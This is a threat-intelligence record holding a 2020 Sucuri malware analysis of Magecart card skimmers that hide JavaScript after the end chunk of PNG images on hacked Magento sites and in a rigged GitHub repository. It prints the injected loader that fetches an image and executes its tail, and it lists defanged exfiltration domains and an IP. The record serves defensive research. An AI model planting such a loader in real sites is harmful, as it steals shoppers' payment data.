@@ -1,0 +1,132 @@
+{
+    "id": "db9a384e-6ad1-4f2b-a263-10da989ed1f5",
+    "created_at": "2023-01-12T15:06:25.776473Z",
+    "updated_at": "2025-03-27T02:14:34.067376Z",
+    "deleted_at": null,
+    "sha1_hash": "f8a9ecef837776b8f4ff0f237a89f9fc6dc5a0ff",
+    "title": "2020-07-22 - Skimmers in Images & GitHub Repos",
+    "authors": "",
+    "file_creation_date": "2022-05-28T19:33:14Z",
+    "file_modification_date": "2022-05-28T19:33:14Z",
+    "file_size": 1619195,
+    "plain_text": "# Sucuri Blog\n\n**blog.sucuri.net/2020/07/skimmers-in-images-github-repos.html**\n\nDenis Sinegubko July 22, 2020\n\n[MalwareBytes recently shared some information about web skimmers that store malicious code inside](https://blog.malwarebytes.com/threat-analysis/2020/06/web-skimmer-hides-within-exif-metadata-exfiltrates-credit-cards-via-image-files/)\nreal .ico files.\n\nDuring a routine investigation, we detected a similar issue. Instead of targeting .ico files, however,\nattackers chose to inject content into real .png files — both on compromised sites and in booby trapped\nMagento repos on GitHub.\n\n### Googletagmanager.png\n\nOur security analyst Keith Petkus found this piece of malware injected on a compromised Magento 2.x\nsite.\n```\n<script>...i();async function i() {let x92 = await\nfetch('/pub/media/wysiwyg/m2themes/googletagmanager.png');if (x92.ok) {let x = await\nx92.text();var F = new Function (x.slice(-34905));return(F());}}</script>\n\n```\nThis code was found appended to real Google Tag Manager code, so seeing a reference to\n**googletagmanager.png might not spark suspicion at first glance. Moreover, it’s a valid .png image from**\nthe same site.\n\n\n-----\n\ngoogletagmanager.png\n\n### JavaScript Inside .png\n\nNonetheless, the code is not typical for Google Tag Manager. If you inspect it closely, you’ll notice that it\nloads contents of the image file and then executes part of it (x.slice(-34905)) as a JavaScript function.\n\nIf we check the contents of googletagmanager.png, it appears to be a regular binary .png file, including\n[proper PNG file signatures and chunk marks such as IHDR and IEND.](https://www.w3.org/TR/PNG-Structure.html)\n\nRaw content of the googletagmanager.png file\nHowever, after the end of the last chunk (IEND), we can see JavaScript code. This code is ignored by\nimage viewers, but you can access it if you work with the .png file as if it was a regular text file. In our\ncase, the malware extracts the last 34,905 bytes of the file.\n\n\n-----\n\n### Skimmer Code\n\nAfter deobfuscation, a typical Magecart skimmer code is revealed containing modifications that prevent\nsomeone from seeing the exfiltration gate right away.\n\nTell tale skimmer parameters\n\nThe following code is responsible for computing the URL of the gate.\n\nDecoding\n\nthe exfiltration gate URL\nWhat we see here is the malware which attempts to load mage.png file from a GitHub repository\n(hxxps://raw.githubusercontent[.]com/mag202/magento/master/pub/media/downloadable/mage.png),\nthen conduct some operations with chunks of its contents.\n\n### Mag202/Magento GitHub Repository\n\nIndeed, at [https://github.com/mag202/magento we find a repository of a beta version of Magento 2.4](https://github.com/mag202/magento)\ncreated by the user mag202 on April 4, 2020.\n\n\n-----\n\nMag202/Magento repository on GitHub\nUnsurprisingly, we found the suspected magento/pub/media/downloadable/mage.png file within the\nrepo.\n\n\n-----\n\nmagento/pub/media/downloadable/mage.png in the mag202/magento repository\n\n### Exfil URL in hidden in mage.png\n\nA quick lookup in the official Magento repository reveals that this directory shouldn’t contain this\n**mage.png file. In fact, it doesn’t have any image files at all.**\n\nWhen checking the raw contents of this file, we find this encrypted text at the very bottom after the IEND\nsignature.\n\nMalicious part of mage.png\nSince we have the actual JavaScript code that decrypts it, we retrieved this exfiltration gate URL:\n“hxxps://fontsgoogle-apis[.]com/v14/“.\n\n### Commit History\n\nOne cool feature of version control systems is that they keep track of all repository modifications. This\n**mag202/magento repository on GitHub also has a public commit history.**\n\n\n-----\n\nCommit\n\nhistory of mag202/magento\nThe commit history basically consists of a series of uploads and deletions for the malicious mage.png\nfile. The hacker modifies the appended malicious code in these files and uploads new versions either in\n**pub/media/downloadable/mage.png or app/design/frontend/Magento/luma/media/mage.png.**\n\nAll historical versions of these files are also available on GitHub. For example, the version from April 10\nof magento/app/design/frontend/Magento/luma/media/mage.png contained the following code\nappended at the end.\n\n\n-----\n\nHistorical version of malware in mage.png\nAt this point, it was real JavaScript code rather than just encrypted text. The purpose of this code was\nthe same, however — to hide the exfiltration details and allow the attacker to update it through GitHub at\ntheir convenience.\n\nAfter its execution, we get the exfiltration URL:\n\nhxxps://googletag-manager[.]com/gtag/GTM-P75S9/\n\n[This is the same URL found in images loaded by similar skimmer malware.](https://publicwww.com/websites/%22x92.text%28%29%3Bvar%22/)\n\n**Nov 4, 2019: googletag-manager[.]com was registered.**\n**May 2nd, 2020: fontsgoogle-apis[.]com (used by the latest version of the malware) is registered.**\nIt is hosted on the server with IP 8.209.99.41.\n\nThis same server also hosts the soon-to-be-expired domain gstatlcs[.]com, which was registered on\n**July 23rd, 2019.**\n\n## Conclusion\n\nWeb skimmer operators are always actively searching for new methods to prevent detection of their\nmalware on compromised websites.\n\nThis time, we found them combining four popular tricks to conceal their malicious code:\n\n1. Including requests to usually benign static content (e.g. stylesheets or images) that are normally\n\n[less scrutinized in traffic monitoring or static file analysis. (1,](https://blog.sucuri.net/2020/01/web-swiper-in-image-title.html) [2)](https://blog.sucuri.net/2016/10/magento-credit-card-swiper-exports-image.html)\n[2. Planting malicious code inside real images. (1,](https://blog.sucuri.net/2018/07/hiding-malware-inside-images-on-googleusercontent.html) [2,](https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html) [3)](https://blog.sucuri.net/2015/11/exif-php-joomla-backdoor.html)\n[3. Hosting malicious files on popular legitimate websites such as GitHub. (1,](https://blog.sucuri.net/2017/12/malicious-cryptominers-from-github.html) [2,](https://blog.sucuri.net/2018/03/github-hosts-lokibot-infostealer.html) [3).](https://blog.sucuri.net/2018/03/github-hosts-infostealers-part-2-cryptominers-and-credit-card-stealers.html)\n4. Using misleading variable names, filenames, and domains to make people believe they belong to a\n\n[reputable popular service (in this case, Google Tag Manager). (1,](https://blog.sucuri.net/2019/08/magento-skimmers-from-atob-to-alibaba.html) [2).](https://blog.sucuri.net/2019/02/google-analytics-and-angular-in-magento-credit-card-stealing-scripts.html)\n\nWhile this approach may make it more difficult to spot the malware for third-party researchers,\n[webmasters who implement integrity control checks or](https://docs.sucuri.net/plugins/core-integrity-check/) [website monitoring services should be able to](https://sucuri.net/malware-detection-scanning/)\ndetect addition of new files to the system or changes in existing files.\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-22 - Skimmers in Images & GitHub Repos.pdf"
+    ],
+    "report_names": [
+        "2020-07-22 - Skimmers in Images & GitHub Repos.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
+            "created_at": "2023-01-06T13:46:38.814104Z",
+            "updated_at": "2025-03-27T02:00:02.925972Z",
+            "deleted_at": null,
+            "main_name": "MageCart",
+            "aliases": [],
+            "source_name": "MISPGALAXY:MageCart",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "3fad11c6-4336-4b28-a606-f510eca5452e",
+            "created_at": "2022-10-25T16:07:24.346573Z",
+            "updated_at": "2025-03-27T02:02:10.183211Z",
+            "deleted_at": null,
+            "main_name": "Turbine Panda",
+            "aliases": [
+                "APT 26",
+                "Black Vine",
+                "Bronze Express",
+                "Group 13",
+                "JerseyMikes",
+                "KungFu Kittens",
+                "PinkPanther",
+                "Shell Crew",
+                "Turbine Panda",
+                "WebMasters"
+            ],
+            "source_name": "ETDA:Turbine Panda",
+            "tools": [
+                "Agent.dhwf",
+                "Agentemis",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "Derusbi",
+                "Destroy RAT",
+                "DestroyRAT",
+                "FF-RAT",
+                "FormerFirstRAT",
+                "Hurix",
+                "Kaba",
+                "Korplug",
+                "LOLBAS",
+                "LOLBins",
+                "Living off the Land",
+                "Mivast",
+                "PlugX",
+                "RbDoor",
+                "RedDelta",
+                "RibDoor",
+                "Sakula",
+                "Sakula RAT",
+                "Sakurel",
+                "Sogu",
+                "StreamEx",
+                "TIGERPLUG",
+                "TVT",
+                "Thoper",
+                "Winnti",
+                "Xamtrav",
+                "cobeacon",
+                "ffrat"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
+            "created_at": "2023-01-06T13:46:38.376868Z",
+            "updated_at": "2025-03-27T02:00:02.818071Z",
+            "deleted_at": null,
+            "main_name": "Cleaver",
+            "aliases": [
+                "Cobalt Gypsy",
+                "G0003",
+                "Operation Cleaver",
+                "Op Cleaver",
+                "Tarh Andishan",
+                "Alibaba",
+                "TG-2889"
+            ],
+            "source_name": "MISPGALAXY:Cleaver",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535985,
+    "ts_updated_at": 1743041674,
+    "ts_creation_date": 1653766394,
+    "ts_modification_date": 1653766394,
+    "files": {
+        "pdf": "https://archive.orkl.eu/f8a9ecef837776b8f4ff0f237a89f9fc6dc5a0ff.pdf",
+        "text": "https://archive.orkl.eu/f8a9ecef837776b8f4ff0f237a89f9fc6dc5a0ff.txt",
+        "img": "https://archive.orkl.eu/f8a9ecef837776b8f4ff0f237a89f9fc6dc5a0ff.jpg"
+    }
+}
